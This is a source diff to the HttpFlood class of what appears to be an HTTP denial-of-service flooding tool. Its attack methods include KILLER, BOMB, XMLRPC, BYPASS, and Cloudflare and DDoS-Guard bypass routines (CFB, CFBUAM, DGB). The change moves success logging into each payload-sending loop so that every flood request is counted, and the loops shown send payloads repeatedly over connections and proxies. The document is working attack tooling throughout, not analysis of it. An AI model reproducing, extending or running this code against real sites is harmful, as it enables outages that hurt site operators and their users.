@@ -769,7 +769,6 @@ class HttpFlood(Thread):
                 extra['proxy'] = "%s:%s" % (self._proxy.host, self._proxy.port)
             try:
                 self.SENT_FLOOD()
-                logger.ok_count(self._method, self.full_target, extra)
             except Exception as err:
                 logger.error_count(self._method, self.full_target, err, extra)
 
@@ -839,6 +838,7 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def STRESS(self) -> None:
@@ -851,6 +851,7 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def COOKIES(self) -> None:
@@ -865,6 +866,7 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def APACHE(self) -> None:
@@ -875,6 +877,7 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def XMLRPC(self) -> None:
@@ -893,6 +896,7 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def PPS(self) -> None:
@@ -900,6 +904,7 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, self._defaultpayload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def KILLER(self) -> None:
@@ -912,6 +917,7 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def BOT(self) -> None:
@@ -939,6 +945,7 @@ class HttpFlood(Thread):
             Tools.send(s, p2)
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def EVEN(self) -> None:
@@ -946,6 +953,7 @@ class HttpFlood(Thread):
         s = None
         with self.open_connection() as s:
             while Tools.send(s, payload) and s.recv(1):
+                logger.ok_count(self._method, self.full_target)
                 continue
         Tools.safe_close(s)
 
@@ -955,6 +963,7 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(min(self._rpc, 5)):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def CFB(self):
@@ -970,11 +979,13 @@ class HttpFlood(Thread):
                                proxies=pro.asRequest()) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
+                        logger.ok_count(self._method, self.full_target)
                         continue
 
                 with s.get(self._target.human_repr()) as res:
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
+                    logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def CFBUAM(self):
@@ -986,6 +997,7 @@ class HttpFlood(Thread):
             ts = time()
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
                 if time() > ts + 120: break
         Tools.safe_close(s)
 
@@ -996,6 +1008,7 @@ class HttpFlood(Thread):
             for _ in range(self._rpc):
                 sleep(max(self._rpc / 1000, 1))
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def DGB(self):
@@ -1009,6 +1022,7 @@ class HttpFlood(Thread):
                                 proxies=pro.asRequest()) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
+                        logger.ok_count(self._method, self.full_target)
                         continue
 
             Tools.safe_close(ss)
@@ -1019,6 +1033,7 @@ class HttpFlood(Thread):
                 with ss.get(self._target.human_repr()) as res:
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
+                    logger.ok_count(self._method, self.full_target)
 
         Tools.safe_close(ss)
 
@@ -1031,6 +1046,7 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def DOWNLOADER(self):
@@ -1040,12 +1056,14 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
                 while 1:
                     sleep(.01)
                     data = s.recv(1)
                     if not data:
                         break
             Tools.send(s, b'0')
+            logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def BYPASS(self):
@@ -1061,11 +1079,13 @@ class HttpFlood(Thread):
                                proxies=pro.asRequest()) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
+                        logger.ok_count(self._method, self.full_target)
                         continue
 
                 with s.get(self._target.human_repr()) as res:
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
+                    logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def GSB(self):
@@ -1089,6 +1109,7 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def NULL(self) -> None:
@@ -1101,6 +1122,7 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
         Tools.safe_close(s)
 
     def BOMB(self):
@@ -1136,10 +1158,12 @@ class HttpFlood(Thread):
         with self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                logger.ok_count(self._method, self.full_target)
             while Tools.send(s, payload) and s.recv(1):
                 for i in range(self._rpc):
                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                     Tools.send(s, keep)
+                    logger.ok_count(self._method, self.full_target)
                     sleep(self._rpc / 15)
                     break
         Tools.safe_close(s)
